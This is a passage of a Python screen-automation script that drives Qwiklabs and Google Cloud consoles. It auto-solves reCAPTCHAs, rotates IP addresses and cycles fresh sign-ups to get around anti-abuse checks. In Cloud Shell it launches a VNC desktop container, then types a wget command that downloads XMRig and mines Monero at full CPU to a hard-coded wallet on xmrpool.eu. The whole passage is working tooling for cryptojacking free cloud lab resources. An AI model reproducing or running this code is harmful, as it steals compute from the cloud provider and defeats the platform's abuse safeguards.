            Controll_Error()

                            # #click in recaptcha

            try:

                if pyautogui.locateOnScreen('recaptchaqwiklabs.png') \
                    != None:
                    pyautogui.click('recaptchaqwiklabs.png')
                    try:
                        sleep(2)
                        if pyautogui.locateOnScreen('buster.png') \
                            != None:
                            pyautogui.click('buster.png')
                            sleep(1)
                        if pyautogui.locateOnScreen('EndLab.png',
                                confidence=0.8) != None:
                            break
                        
                        else:
                            retry2()
                        recaptcha_Ip_Blocker()
                        if pyautogui.locateOnScreen('busterMoney.png') \
                            != None:
                            Buster_Money()
                            keyboard.press(Key.ctrl)
                            keyboard.press('2')
                            keyboard.release('2')
                            keyboard.release(Key.ctrl)
                            sleep(0.5)
                        Controll_Error()
                    except:
                        sleep(2)
                        if pyautogui.locateOnScreen('buster.png') \
                            != None:
                            pyautogui.click('buster.png')
                            sleep(1)
                        if pyautogui.locateOnScreen('busterMoney.png') \
                            != None:
                            Buster_Money()
                            keyboard.press(Key.ctrl)
                            keyboard.press('2')
                            keyboard.release('2')
                            keyboard.release(Key.ctrl)
                            sleep(0.5)
                        Controll_Error()
                        recaptcha_Ip_Blocker()
                if pyautogui.locateOnScreen('EndLab.png',
                        confidence=0.8) != None:
                    break
                else:
                    retry2()
                Controll_Error()
            except:
                if pyautogui.locateOnScreen('EndLab.png',
                        confidence=0.8) != None:
                    break
                else:
                    retry2()
                Controll_Error()
                            # #click on solver

            try:

                if pyautogui.locateOnScreen('buster.png') != None:
                    pyautogui.click('buster.png')
                    sleep(1)
                if pyautogui.locateOnScreen('captchaPASS.png',
                        confidence=0.8) != None:
                    break
                if pyautogui.locateOnScreen('busterMoney.png') \
                    != None:
                    Buster_Money()
                    keyboard.press(Key.ctrl)
                    keyboard.press('2')
                    keyboard.release('2')
                    keyboard.release(Key.ctrl)
                    sleep(0.5)
                Controll_Error()
                recaptcha_Ip_Blocker()
            except:
                sleep(2)
                if pyautogui.locateOnScreen('buster.png') != None:
                    pyautogui.click('buster.png')
                    sleep(1)
                if pyautogui.locateOnScreen('busterMoney.png') \
                    != None:
                    Buster_Money()
                    keyboard.press(Key.ctrl)
                    keyboard.press('2')
                    keyboard.release('2')
                    keyboard.release(Key.ctrl)
                    sleep(0.5)
                Controll_Error()
                recaptcha_Ip_Blocker()
            sleep(8)
            if pyautogui.locateOnScreen('captchaPASS.png',
                    confidence=0.8) != None:
                break


                            # #click on refresh

            try:

                if pyautogui.locateOnScreen('refresh.png') != None:
                    pyautogui.click('refresh.png')
                    sleep(1)
                if pyautogui.locateOnScreen('captchaPASS.png',
                        confidence=0.8) != None:
                    break
                Controll_Error()
            except:
                sleep(2)
                if pyautogui.locateOnScreen('refresh.png') != None:
                    pyautogui.click('refresh.png')
                    sleep(1)
                
            sleep(3)
            if pyautogui.locateOnScreen('captchaPASS.png',
                    confidence=0.8) != None:
                break
            Controll_Error()
            try:

                if pyautogui.locateOnScreen('buster.png') != None:
                    pyautogui.click('buster.png')
                    sleep(8)
                if pyautogui.locateOnScreen('captchaPASS.png',
                        confidence=0.8) != None:
                    break
                if pyautogui.locateOnScreen('busterMoney.png') \
                    != None:
                    Buster_Money()
                    keyboard.press(Key.ctrl)
                    keyboard.press('2')
                    keyboard.release('2')
                    keyboard.release(Key.ctrl)
                    sleep(0.5)
                Controll_Error()
                recaptcha_Ip_Blocker()
            except:
                if pyautogui.locateOnScreen('captchaPASS.png') == None:
                    i = 1
                    while True:
                        panj()
                        ChangeIp()
                        if i == 1:
                            signup()
                            sleep(3)
                            signin()
                            i = i + 1
                        sleep(3)
                        if i % 5 == 0:
                            panj()
                            i = 0
                        i = i + 1

        # #select console

    mouse.position = (170, 321)
    mouse.click(Button.left, 1)
    sleep(4)

        # #back to pre page

    keyboard.press(Key.ctrl)
    keyboard.press('1')
    keyboard.release('1')
    keyboard.release(Key.ctrl)
    sleep(0.5)

        # #copy user:

    mouse.position = (248, 393)
    mouse.click(Button.left, 2)
    sleep(0.2)
    c = pyperclip.paste()

        # #back to console

    keyboard.press(Key.ctrl)
    keyboard.press('2')
    keyboard.release('2')
    keyboard.release(Key.ctrl)
    sleep(0.5)
    ##wait
    if pyautogui.locateOnScreen('GoogleSignin.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('GoogleSignin.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleSignin.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('GoogleSignin.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleSignin.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('GoogleSignin.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleSignin.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('GoogleSignin.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleSignin.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('GoogleSignin.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleSignin.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('GoogleSignin.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleSignin.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('GoogleSignin.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleSignin.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('GoogleSignin.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleSignin.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('GoogleSignin.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleSignin.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('GoogleSignin.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleSignin.png') == None:
        i = 1
        while True:
            panj()
            ChangeIp()
            if i == 1:
                signup()
                sleep(3)
                signin()
                i = i + 1
            sleep(3)
            if i % 5 == 0:
                panj()
                i = 0
            i = i + 1

        # #paste user:

    sleep(0.5)
    mouse.position = (582, 363)
    mouse.click(Button.left, 1)
    keyboard.press(Key.ctrl)
    keyboard.press('a')
    keyboard.release('a')
    keyboard.release(Key.ctrl)
    keyboard.press(Key.backspace)
    keyboard.release(Key.backspace)
    keyboard.type(c)
    keyboard.press(Key.enter)
    keyboard.release(Key.enter)

        # #back to pre page

    keyboard.press(Key.ctrl)
    keyboard.press('1')
    keyboard.release('1')
    keyboard.release(Key.ctrl)
    sleep(1)

        # #copy pass:

    mouse.position = (251, 475)
    mouse.click(Button.left, 2)
    sleep(0.2)
    c = pyperclip.paste()
    sleep(2)

        # #back to console

    keyboard.press(Key.ctrl)
    keyboard.press('2')
    keyboard.release('2')
    keyboard.release(Key.ctrl)
    sleep(0.5)

        # #paste pass:

    sleep(0.5)
    mouse.position = (582, 363)
    mouse.click(Button.left, 1)
    keyboard.press(Key.ctrl)
    keyboard.press('a')
    keyboard.release('a')
    keyboard.release(Key.ctrl)
    keyboard.press(Key.backspace)
    keyboard.release(Key.backspace)
    keyboard.type(c)
    keyboard.press(Key.enter)
    keyboard.release(Key.enter)
    ChangeIp_On_Or_Off()
    ## wait
    ##wait
    if pyautogui.locateOnScreen('GoogleAccept.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('GoogleAccept.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleAccept.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('GoogleAccept.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleAccept.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('GoogleAccept.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleAccept.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('GoogleAccept.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleAccept.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('GoogleAccept.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleAccept.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('GoogleAccept.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleAccept.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('GoogleAccept.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleAccept.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('GoogleAccept.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleAccept.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('GoogleAccept.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleAccept.png') == None:
        sleep(7)
    if pyautogui.locateOnScreen('GoogleAccept.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleAccept.png') == None:
        ChangeIp_On_Or_Off()
        i = 1
        panj()
        while True:
            
            ChangeIp()
            if i == 1:
                signup()
                sleep(3)
                signin()
                i = i + 1
            signin2()
            sleep(3)
            if i % 5 == 0:
                panj()
                i = 0
            i = i + 1

        # #click accept

    mouse.position = (678, 575)
    mouse.click(Button.left, 1)
    mouse.position = (574, 603)
    mouse.click(Button.left, 1)
    ##wait
    if pyautogui.locateOnScreen('GoogleConfirm.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('GoogleConfirm.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleConfirm.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('GoogleConfirm.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleConfirm.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('GoogleConfirm.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleConfirm.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('GoogleConfirm.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleConfirm.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('GoogleConfirm.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleConfirm.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('GoogleConfirm.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleConfirm.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('GoogleConfirm.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleConfirm.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('GoogleConfirm.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleConfirm.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('GoogleConfirm.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleConfirm.png') == None:
        sleep(7)
    if pyautogui.locateOnScreen('GoogleConfirm.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleConfirm.png') == None:
        ChangeIp_On_Or_Off()
        i = 1
        panj()
        while True:
            
            ChangeIp()
            if i == 1:
                signup()
                sleep(3)
                signin()
                i = i + 1
            signin2()
            sleep(3)
            if i % 5 == 0:
                panj()
                i = 0
            i = i + 1

        # #click confirm

    mouse.position = (824, 643)
    mouse.click(Button.left, 1)

        # #save pass

    mouse.position = (1140, 370)
    mouse.click(Button.left, 1)
    sleep(1.5)

        # #back to google console

    keyboard.press(Key.ctrl)
    keyboard.press('2')
    keyboard.release('2')
    keyboard.release(Key.ctrl)
    sleep(0.2)
    ##wait
    if pyautogui.locateOnScreen('GoogleWaitCheckbox.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('GoogleWaitCheckbox.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleWaitCheckbox.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('GoogleWaitCheckbox.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleWaitCheckbox.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('GoogleWaitCheckbox.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleWaitCheckbox.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('GoogleWaitCheckbox.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleWaitCheckbox.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('GoogleWaitCheckbox.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleWaitCheckbox.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('GoogleWaitCheckbox.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleWaitCheckbox.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('GoogleWaitCheckbox.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleWaitCheckbox.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('GoogleWaitCheckbox.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleWaitCheckbox.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('GoogleWaitCheckbox.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleWaitCheckbox.png') == None:
        sleep(7)
    if pyautogui.locateOnScreen('GoogleWaitCheckbox.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleWaitCheckbox.png') == None:
        ChangeIp_On_Or_Off()
        i = 1
        panj()
        while True:
            
            ChangeIp()
            if i == 1:
                signup()
                sleep(3)
                signin()
                i = i + 1
            signin2()
            sleep(3)
            if i % 5 == 0:
                panj()
                i = 0
            i = i + 1

        # #choose country:

    mouse.position = (83, 642)
    mouse.click(Button.left, 1)
    sleep(0.5)
    keyboard.type('u')
    keyboard.press(Key.enter)
    keyboard.release(Key.enter)
    sleep(2)

        # #checkbox

    mouse.position = (434, 488)
    mouse.click(Button.left, 1)
    sleep(1)
    mouse.position = (432, 433)
    mouse.click(Button.left, 1)
    sleep(1)
    mouse.position = (436, 536)
    mouse.click(Button.left, 1)
    sleep(1)

        # click agree

    mouse.position = (860, 651)
    mouse.click(Button.left, 1)
    sleep(1)
    mouse.position = (852, 602)
    mouse.click(Button.left, 1)
    sleep(5)
    mouse.position = (852, 602)
    mouse.click(Button.left, 1)
    sleep(3)

        # #save pass
        # mouse.position = (1140, 370)
        # mouse.click(Button.left, 1)
        # sleep(2)
        # #click Terminal

    mouse.position = (1165, 89)
    mouse.click(Button.left, 1)
    ##wait Continue
    ##wait
    if pyautogui.locateOnScreen('CountinueTerminal.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('CountinueTerminal.png') != None:
        pass
    if pyautogui.locateOnScreen('CountinueTerminal.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('CountinueTerminal.png') != None:
        pass
    if pyautogui.locateOnScreen('CountinueTerminal.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('CountinueTerminal.png') != None:
        pass
    if pyautogui.locateOnScreen('CountinueTerminal.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('CountinueTerminal.png') != None:
        pass
    if pyautogui.locateOnScreen('CountinueTerminal.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('CountinueTerminal.png') != None:
        pass
    if pyautogui.locateOnScreen('CountinueTerminal.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('CountinueTerminal.png') != None:
        pass
    if pyautogui.locateOnScreen('CountinueTerminal.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('CountinueTerminal.png') != None:
        pass
    if pyautogui.locateOnScreen('CountinueTerminal.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('CountinueTerminal.png') != None:
        pass
    if pyautogui.locateOnScreen('CountinueTerminal.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('CountinueTerminal.png') != None:
        pass
    if pyautogui.locateOnScreen('CountinueTerminal.png') == None:
        sleep(7)
    if pyautogui.locateOnScreen('CountinueTerminal.png') != None:
        pass
    if pyautogui.locateOnScreen('CountinueTerminal.png') == None:
        ChangeIp_On_Or_Off()
        i = 1
        panj()
        while True:
            
            ChangeIp()
            if i == 1:
                signup()
                sleep(3)
                signin()
                i = i + 1
            signin2()
            sleep(3)
            if i % 5 == 0:
                panj()
                i = 0
            i = i + 1
    pyautogui.click('CountinueTerminal.png')
    #wait
    if pyautogui.locateOnScreen('WhaitUntilLoadShell.png') == None:
        sleep(10)
    if pyautogui.locateOnScreen('WhaitUntilLoadShell.png') != None:
        pass
    if pyautogui.locateOnScreen('WhaitUntilLoadShell.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('WhaitUntilLoadShell.png') != None:
        pass
    if pyautogui.locateOnScreen('WhaitUntilLoadShell.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('WhaitUntilLoadShell.png') != None:
        pass
    if pyautogui.locateOnScreen('WhaitUntilLoadShell.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('WhaitUntilLoadShell.png') != None:
        pass
    if pyautogui.locateOnScreen('WhaitUntilLoadShell.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('WhaitUntilLoadShell.png') != None:
        pass
    if pyautogui.locateOnScreen('WhaitUntilLoadShell.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('WhaitUntilLoadShell.png') != None:
        pass
    if pyautogui.locateOnScreen('WhaitUntilLoadShell.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('WhaitUntilLoadShell.png') != None:
        pass
    if pyautogui.locateOnScreen('WhaitUntilLoadShell.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('WhaitUntilLoadShell.png') != None:
        pass
    if pyautogui.locateOnScreen('WhaitUntilLoadShell.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('WhaitUntilLoadShell.png') != None:
        pass
    if pyautogui.locateOnScreen('WhaitUntilLoadShell.png') == None:
        sleep(7)
    if pyautogui.locateOnScreen('WhaitUntilLoadShell.png') != None:
        pass
    if pyautogui.locateOnScreen('WhaitUntilLoadShell.png') == None:
        ChangeIp_On_Or_Off()
        i = 1
        panj()
        while True:
            
            ChangeIp()
            if i == 1:
                signup()
                sleep(3)
                signin()
                i = i + 1
            signin2()
            sleep(3)
            if i % 5 == 0:
                panj()
                i = 0
            i = i + 1
    
        # #select on shell

    mouse.position = (516, 651)
    mouse.click(Button.left, 1)

        # #type command

    keyboard.type('docker run -p 6080:80 dorowu/ubuntu-desktop-lxde-vnc'
                  )
    keyboard.press(Key.enter)
    keyboard.release(Key.enter)

        # #back to google console

    keyboard.press(Key.ctrl)
    keyboard.press('2')
    keyboard.release('2')
    keyboard.release(Key.ctrl)
    sleep(1)

        # #sleep

    sleep(45)

        # #change port

    mouse.position = (1150, 469)
    mouse.click(Button.left, 1)
    sleep(1)
    mouse.position = (1077, 552)
    mouse.click(Button.left, 1)
    sleep(1)
    mouse.position = (490, 578)
    mouse.click(Button.left, 1)
    sleep(1)
    keyboard.type('6080')
    sleep(1)
    mouse.position = (504, 670)
    mouse.click(Button.left, 1)
    sleep(20)

        # #select terminal

    mouse.position = (10, 712)
    mouse.click(Button.left, 1)
    sleep(1.5)
    mouse.position = (98, 560)
    mouse.click(Button.left, 1)
    sleep(1.5)
    mouse.position = (219, 585)
    mouse.click(Button.left, 1)
    sleep(1.5)

        # #select on terminal

    mouse.position = (570, 408)
    mouse.click(Button.left, 1)
    sleep(1)

        # #write command

    keyboard.type('wget https://github.com/xmrig/xmrig/releases/download/v6.3.5/xmrig-6.3.5-linux-x64.tar.gz && tar xf xmrig-6.3.5-linux-x64.tar.gz && cd xmrig-6.3.5 && ./xmrig --donate-level 1 --max-cpu-usage 100 -o xmrpool.eu:5555 -u 46SCYJfsfSEj1EEHmwCKgCg9mgqg8xbx9BdczDJ9uqUpJRwvnSrHb517vWoE7x3Nv3iJEKbtip9T74QvZB8TJXJ86iXiGkr -p x'
                  )
    sleep(0.5)
    keyboard.press(Key.enter)
    keyboard.release(Key.enter)
    sleep(1.5)
    

        # #back to first page

    mouse.position = (4, 12)
    mouse.click(Button.left, 1)
    sleep(4)

        # #select stop

    mouse.position = (55, 177)
    mouse.click(Button.left, 1)
    sleep(4)
    keyboard.press(Key.enter)
    keyboard.release(Key.enter)
    sleep(6)

        # #cancel

    mouse.position = (802, 459)
    mouse.click(Button.left, 1)
    sleep(4)

        # #go to setting

    keyboard.press(Key.ctrl)
    keyboard.press('t')
    keyboard.release('t')
    keyboard.release(Key.ctrl)
    sleep(0.5)
    keyboard.press(Key.ctrl)
    keyboard.press('l')
    keyboard.release('l')
    keyboard.release(Key.ctrl)
    sleep(0.5)
    keyboard.type('https://mail.google.com/mail/?logout&hl=en')
    keyboard.press(Key.enter)
    keyboard.release(Key.enter)
    sleep(7)

        # #remove pre account

    sleep(1.5)
    mouse.position = (586, 428)
    sleep(0.5)
    mouse.click(Button.left, 1)
    sleep(1)
    mouse.position = (856, 351)
    mouse.click(Button.left, 1)
    sleep(2)
    mouse.position = (775, 482)
    mouse.click(Button.left, 1)
    sleep(0.5)

        # #close tab

    keyboard.press(Key.ctrl)
    keyboard.press('w')
    keyboard.release('w')
    keyboard.release(Key.ctrl)
    sleep(0.5)
    ChangeIp_On_Or_Off()
    
        # #back to first page

    mouse.position = (4, 14)
    mouse.click(Button.left, 1)
    sleep(0.5)
    keyboard.press(Key.ctrl)
    keyboard.press('1')
    keyboard.release('1')
    keyboard.release(Key.ctrl)
    sleep(0.5)
    keyboard.press(Key.ctrl)
    keyboard.press('r')
    keyboard.release('r')
    keyboard.release(Key.ctrl)
    sleep(6)
def signin2():
    sleep(3)
        # #select start

    mouse.position = (55, 177)
    mouse.click(Button.left, 1)
    mouse.click(Button.left, 1)
    sleep(3)

        # #select recaptcha
        # #click in recaptcha

    while True:
        if True:
            try:

                if pyautogui.locateOnScreen('recaptchaqwiklabs.png') \
                    != None:
                    pyautogui.click('recaptchaqwiklabs.png')
                    sleep(1)
                if pyautogui.locateOnScreen('EndLab.png',
                        confidence=0.8) != None:
                    break
                else:
                    retry2()
                Controll_Error()
                
            except:
                sleep(6)
                if pyautogui.locateOnScreen('recaptchaqwiklabs.png') \
                    != None:
                    pyautogui.click('recaptchaqwiklabs.png')
                    sleep(1)
                if pyautogui.locateOnScreen('EndLab.png',
                        confidence=0.8) != None:
                    break
                else:
                    retry2()
                Controll_Error()

                            # #click on solver

            try:
                sleep(2)
                if pyautogui.locateOnScreen('buster.png') != None:
                    pyautogui.click('buster.png')
                    sleep(1)
                if pyautogui.locateOnScreen('EndLab.png',
                        confidence=0.8) != None:
                    break
                else:
                    retry2()
                if pyautogui.locateOnScreen('busterMoney.png') \
                    != None:
                    Buster_Money()
                    keyboard.press(Key.ctrl)
                    keyboard.press('2')
                    keyboard.release('2')
                    keyboard.release(Key.ctrl)
                    sleep(0.5)
                Controll_Error()
                recaptcha_Ip_Blocker()
                
            except:
                sleep(2)
                if pyautogui.locateOnScreen('buster.png') != None:
                    pyautogui.click('buster.png')
                    sleep(1)
                if pyautogui.locateOnScreen('busterMoney.png') \
                    != None:
                    Buster_Money()
                    keyboard.press(Key.ctrl)
                    keyboard.press('2')
                    keyboard.release('2')
                    keyboard.release(Key.ctrl)
                    sleep(0.5)
                Controll_Error()
                recaptcha_Ip_Blocker()
            sleep(8)
            if pyautogui.locateOnScreen('EndLab.png',
                    confidence=0.8) != None:
                break
            else:
                retry2()

                            # #click on refresh

            try:

                if pyautogui.locateOnScreen('refresh.png') != None:
                    pyautogui.click('refresh.png')
                    sleep(1)
                if pyautogui.locateOnScreen('EndLab.png',
                        confidence=0.8) != None:
                    break
                else:
                    retry2()
                Controll_Error()
                
            except:
                sleep(2)
                if pyautogui.locateOnScreen('refresh.png') != None:
                    pyautogui.click('refresh.png')
                    sleep(1)
                
            sleep(3)
            if pyautogui.locateOnScreen('EndLab.png',
                    confidence=0.8) != None:
                break
            else:
                retry2()
            Controll_Error()
            try:

                if pyautogui.locateOnScreen('recaptchaqwiklabs.png') \
                    != None:
                    pyautogui.click('recaptchaqwiklabs.png')
                    sleep(1)
                if pyautogui.locateOnScreen('EndLab.png',
                        confidence=0.8) != None:
                    break
                else:
                    retry2()
                Controll_Error()

                
            except:
                sleep(6)
                if pyautogui.locateOnScreen('recaptchaqwiklabs.png') \
                    != None:
                    pyautogui.click('recaptchaqwiklabs.png')
                    sleep(1)
                if pyautogui.locateOnScreen('EndLab.png',
                        confidence=0.8) != None:
                    break
                else:
                    retry2()
                Controll_Error()
                

                            # #click on solver

            try:
                sleep(2)
                if pyautogui.locateOnScreen('buster.png') != None:
                    pyautogui.click('buster.png')
                    sleep(1)
                if pyautogui.locateOnScreen('EndLab.png',
                        confidence=0.8) != None:
                    break

                else:
                    retry2()
                recaptcha_Ip_Blocker() 
                if pyautogui.locateOnScreen('busterMoney.png') \
                    != None:
                    Buster_Money()
                    keyboard.press(Key.ctrl)
                    keyboard.press('2')
                    keyboard.release('2')
                    keyboard.release(Key.ctrl)
                    sleep(0.5)
                Controll_Error()
                recaptcha_Ip_Blocker()
            except:
                sleep(2)
                if pyautogui.locateOnScreen('buster.png') != None:
                    pyautogui.click('buster.png')
                    sleep(1)
                if pyautogui.locateOnScreen('busterMoney.png') \
                    != None:
                    Buster_Money()
                    keyboard.press(Key.ctrl)
                    keyboard.press('2')
                    keyboard.release('2')
                    keyboard.release(Key.ctrl)
                    sleep(0.5)
                recaptcha_Ip_Blocker()
                
            sleep(8)
            if pyautogui.locateOnScreen('EndLab.png',
                    confidence=0.8) != None:
                break
            else:
                retry2()
            Controll_Error()

                            # #click on refresh

            try:

                if pyautogui.locateOnScreen('refresh.png') != None:
                    pyautogui.click('refresh.png')
                    sleep(1)
                if pyautogui.locateOnScreen('EndLab.png',
                        confidence=0.8) != None:
                    break
                else:
                    retry2()
                Controll_Error()
                
            except:
                sleep(2)
                if pyautogui.locateOnScreen('refresh.png') != None:
                    pyautogui.click('refresh.png')
                    sleep(1)
                
            sleep(3)
            if pyautogui.locateOnScreen('EndLab.png',
                    confidence=0.8) != None:
                break
            else:
                retry2()
            Controll_Error()

                            # #click in recaptcha

            try:

                if pyautogui.locateOnScreen('recaptchaqwiklabs.png') \
                    != None:
                    pyautogui.click('recaptchaqwiklabs.png')
                    try:
                        sleep(2)
                        if pyautogui.locateOnScreen('buster.png') \
                            != None:
                            pyautogui.click('buster.png')
                            sleep(1)
                        
                        if pyautogui.locateOnScreen('EndLab.png',
                                confidence=0.8) != None:
                            break
                        else:
                            retry2()
                        if pyautogui.locateOnScreen('busterMoney.png') \
                            != None:
                            Buster_Money()
                            keyboard.press(Key.ctrl)
                            keyboard.press('2')
                            keyboard.release('2')
                            keyboard.release(Key.ctrl)
                            sleep(0.5)
                        Controll_Error()
                        recaptcha_Ip_Blocker()
                    except:
                        sleep(2)
                        if pyautogui.locateOnScreen('buster.png') \
                            != None:
                            pyautogui.click('buster.png')
                            sleep(1)
                        
                        if pyautogui.locateOnScreen('busterMoney.png') \
                            != None:
                            Buster_Money()
                            keyboard.press(Key.ctrl)
                            keyboard.press('2')
                            keyboard.release('2')
                            keyboard.release(Key.ctrl)
                            sleep(0.5)
                        Controll_Error()
                        recaptcha_Ip_Blocker()
                if pyautogui.locateOnScreen('EndLab.png',
                        confidence=0.8) != None:
                    break
                else:
                    retry2()


            except:
                if pyautogui.locateOnScreen('EndLab.png',
                        confidence=0.8) != None:
                    break
                else:
                    retry2()
                Controll_Error()

                            # #click on solver

            try:

                if pyautogui.locateOnScreen('buster.png') != None:
                    pyautogui.click('buster.png')
                    sleep(1)
                
                if pyautogui.locateOnScreen('captchaPASS.png',
                        confidence=0.8) != None:
                    break
                if pyautogui.locateOnScreen('busterMoney.png') \
                    != None:
                    Buster_Money()
                    keyboard.press(Key.ctrl)
                    keyboard.press('2')
                    keyboard.release('2')
                    keyboard.release(Key.ctrl)
                    sleep(0.5)
                Controll_Error()
                recaptcha_Ip_Blocker()
                
            except:
                sleep(2)
                if pyautogui.locateOnScreen('buster.png') != None:
                    pyautogui.click('buster.png')
                    sleep(1)
                if pyautogui.locateOnScreen('busterMoney.png') \
                    != None:
                    Buster_Money()
                    keyboard.press(Key.ctrl)
                    keyboard.press('2')
                    keyboard.release('2')
                    keyboard.release(Key.ctrl)
                    sleep(0.5)
                Controll_Error()
                recaptcha_Ip_Blocker()
            sleep(8)
            if pyautogui.locateOnScreen('captchaPASS.png',
                    confidence=0.8) != None:
                break


                            # #click on refresh

            try:

                if pyautogui.locateOnScreen('refresh.png') != None:
                    pyautogui.click('refresh.png')
                    sleep(1)
                if pyautogui.locateOnScreen('captchaPASS.png',
                        confidence=0.8) != None:
                    break
                Controll_Error()
                
            except:
                sleep(2)
                if pyautogui.locateOnScreen('refresh.png') != None:
                    pyautogui.click('refresh.png')
                    sleep(1)
                
            sleep(3)
            if pyautogui.locateOnScreen('captchaPASS.png',
                    confidence=0.8) != None:
                break
            Controll_Error()
            try:

                if pyautogui.locateOnScreen('buster.png') != None:
                    pyautogui.click('buster.png')
                    sleep(8)
                if pyautogui.locateOnScreen('captchaPASS.png',
                        confidence=0.8) != None:
                    break
                recaptcha_Ip_Blocker()
                
                if pyautogui.locateOnScreen('busterMoney.png') \
                    != None:
                    Buster_Money()
                    keyboard.press(Key.ctrl)
                    keyboard.press('2')
                    keyboard.release('2')
                    keyboard.release(Key.ctrl)
                    sleep(0.5)
                Controll_Error()
                recaptcha_Ip_Blocker()
            except:
                if pyautogui.locateOnScreen('captchaPASS.png') == None:
                    i = 1
                    panj()
                    while True:
            
                        ChangeIp()
                        if i == 1:
                            signup()
                            sleep(3)
                            signin()
                            i = i + 1
                        signin2()
                        sleep(3)
                        if i % 5 == 0:
                            panj()
                            i = 0
                        i = i + 1

        # #select console

    mouse.position = (170, 321)
    mouse.click(Button.left, 1)
    sleep(4)

        # #back to pre page

    keyboard.press(Key.ctrl)
    keyboard.press('1')
    keyboard.release('1')
    keyboard.release(Key.ctrl)
    sleep(0.5)

        # #copy user:

    mouse.position = (248, 393)
    mouse.click(Button.left, 2)
    sleep(0.2)
    c = pyperclip.paste()

        # #back to console

    keyboard.press(Key.ctrl)
    keyboard.press('2')
    keyboard.release('2')
    keyboard.release(Key.ctrl)
    sleep(0.5)
    ##wait
    if pyautogui.locateOnScreen('GoogleSignin.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('GoogleSignin.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleSignin.png') == None:
